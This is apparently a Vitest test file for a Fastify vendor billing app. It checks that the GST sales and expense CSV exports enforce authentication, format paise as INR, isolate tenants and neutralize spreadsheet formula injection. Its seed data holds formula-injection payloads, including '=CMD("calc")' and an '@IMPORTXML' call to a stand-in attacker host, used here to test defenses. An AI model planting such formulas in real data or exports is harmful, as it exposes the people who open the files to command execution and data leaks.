import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import type { FastifyInstance } from 'fastify';
import { buildApp } from '../../server/src/app.js';
import { getDatabase, closeDatabase } from '../../server/src/db/database.js';
import { AuthService } from '../../server/src/modules/auth/auth.service.js';
import { signJoseAccessToken, getJwtKeyRotationConfig } from '../../server/src/modules/auth/jwt-jose.js';
import { loadConfig } from '../../server/src/config/env.js';
import { OrderService } from '../../server/src/modules/orders/order.service.js';
import { GallaService } from '../../server/src/modules/galla/galla.service.js';
import { getIstDateString } from '../../server/src/utils/ist-date.js';

describe('EXP-01: CA-Ready GST Sales Register & Galla CSV Exports', () => {
  let app: FastifyInstance;
  let vendorToken: string;
  let vendorId: string;
  let vendorBToken: string;
  let vendorBId: string;
  const todayIst = getIstDateString();

  beforeAll(async () => {
    process.env.USE_MEMORY_DB = 'true';
    process.env.JWT_SECRET = 'test-secret-key-for-exp-01-unit-tests-only';
    app = await buildApp({ logger: false });
    await app.ready();

    const db = getDatabase();
    const config = loadConfig();
    const jwtConfig = getJwtKeyRotationConfig(config);

    // Vendor A
    const regA = await AuthService.registerVendor(db, {
      businessName: 'Export Spice Stall',
      ownerName: 'Ramesh',
      phone: '9876543210',
      password: 'FroseExport#2026!',
      city: 'Hyderabad',
    });
    vendorId = regA.vendor.id;
    const tokenA = await signJoseAccessToken(
      {
        sub: vendorId,
        phone: regA.vendor.phone,
        businessName: regA.vendor.business_name,
        role: 'owner',
        edition: 'cloud',
      },
      jwtConfig,
      900,
    );
    vendorToken = `frose_access_token=${tokenA}`;

    // Vendor B
    const regB = await AuthService.registerVendor(db, {
      businessName: 'Secret Competitor Stall',
      ownerName: 'Suresh',
      phone: '9876543211',
      password: 'FroseExport#2026!',
      city: 'Chennai',
    });
    vendorBId = regB.vendor.id;
    const tokenB = await signJoseAccessToken(
      {
        sub: vendorBId,
        phone: regB.vendor.phone,
        businessName: regB.vendor.business_name,
        role: 'owner',
        edition: 'cloud',
      },
      jwtConfig,
      900,
    );
    vendorBToken = `frose_access_token=${tokenB}`;

    // Seed Vendor A menu item + order with 6300 paise (63.00 INR) and formula-injection note
    const itemA = await db
      .insertInto('menu_items')
      .values({
        vendor_id: vendorId,
        name: 'Masala Dosa',
        category: 'Tiffin',
        price_paise: 6000,
        is_veg: true,
        display_order: 1,
        is_available: true,
        is_active: true,
      })
      .returningAll()
      .executeTakeFirstOrThrow();

    await OrderService.createOrder(db, vendorId, {
      items: [{ menuItemId: itemA.id, quantity: 1 }],
      paymentMethod: 'cash',
      paymentStatus: 'paid',
      orderType: 'parcel',
      customerName: '=CMD("calc")',
      notes: '+SUM(1,2) extra chutney',
    });

    await GallaService.logExpense(db, vendorId, {
      amountPaise: 6300,
      description: '@IMPORTXML("http://evil.example")',
      category: 'groceries',
      paymentMethod: 'cash',
      expenseDate: todayIst,
    });

    // Seed Vendor B menu item + order
    const itemB = await db
      .insertInto('menu_items')
      .values({
        vendor_id: vendorBId,
        name: 'Vendor B Secret Biryani',
        category: 'Meals',
        price_paise: 15000,
        is_veg: false,
        display_order: 1,
        is_available: true,
        is_active: true,
      })
      .returningAll()
      .executeTakeFirstOrThrow();

    await OrderService.createOrder(db, vendorBId, {
      items: [{ menuItemId: itemB.id, quantity: 1 }],
      paymentMethod: 'upi',
      paymentStatus: 'paid',
      customerName: 'VendorBOnlyCustomer',
    });
  });

  afterAll(async () => {
    if (app) await app.close();
    await closeDatabase();
  });

  it('rejects unauthenticated requests to sales.csv and expenses.csv with 401', async () => {
    const res1 = await app.inject({ method: 'GET', url: '/api/v1/galla/export/sales.csv' });
    expect(res1.statusCode).toBe(401);

    const res2 = await app.inject({ method: 'GET', url: '/api/v1/galla/export/expenses.csv' });
    expect(res2.statusCode).toBe(401);
  });

  it('rejects invalid dateFrom/dateTo query params with 400', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/api/v1/galla/export/sales.csv?dateFrom=2026-13-45&unknown=1',
      headers: { Cookie: vendorToken },
    });
    expect(res.statusCode).toBe(400);
  });

  it('exports CA-ready sales.csv with exact INR paise formatting, formula-injection neutralization, and tenant isolation', async () => {
    const res = await app.inject({
      method: 'GET',
      url: `/api/v1/galla/export/sales.csv?dateFrom=${todayIst}&dateTo=${todayIst}`,
      headers: { Cookie: vendorToken },
    });

    expect(res.statusCode).toBe(200);
    expect(res.headers['content-type']).toContain('text/csv');
    expect(res.headers['content-disposition']).toContain(`filename="frose-sales-${todayIst}.csv"`);

    const lines = res.body.trim().split(/\r?\n/);
    expect(lines[0]).toBe(
      'Receipt No,Token,Date IST,Time IST,Status,Tax Mode,Order Type,Customer/Notes,Subtotal INR,CGST INR,SGST INR,Total INR,Payment Mode,Cash INR,UPI INR,Cancel Reason,Edited At'
    );
    expect(lines.length).toBeGreaterThanOrEqual(2);

    const row = lines[1];
    // 6000 paise -> 60.00 INR
    expect(row).toContain('60.00');
    // Formula injection neutralized with leading single quote
    expect(row).toContain("'=CMD");
    expect(row).not.toMatch(/(?:^|,)"?=CMD/);
    // Vendor B's data must not appear
    expect(res.body).not.toContain('VendorBOnlyCustomer');
  });

  it('exports expenses.csv with exact paise-to-INR formatting (6300 -> 63.00) and formula neutralization', async () => {
    const res = await app.inject({
      method: 'GET',
      url: `/api/v1/galla/export/expenses.csv?dateFrom=${todayIst}&dateTo=${todayIst}`,
      headers: { Cookie: vendorToken },
    });

    expect(res.statusCode).toBe(200);
    expect(res.headers['content-type']).toContain('text/csv');
    expect(res.headers['content-disposition']).toContain(`filename="frose-expenses-${todayIst}.csv"`);

    const lines = res.body.trim().split(/\r?\n/);
    expect(lines[0]).toBe('Date IST,Category,Description,Amount INR');
    expect(lines[1]).toContain('63.00');
    expect(lines[1]).toContain("'@IMPORTXML");
  });
});
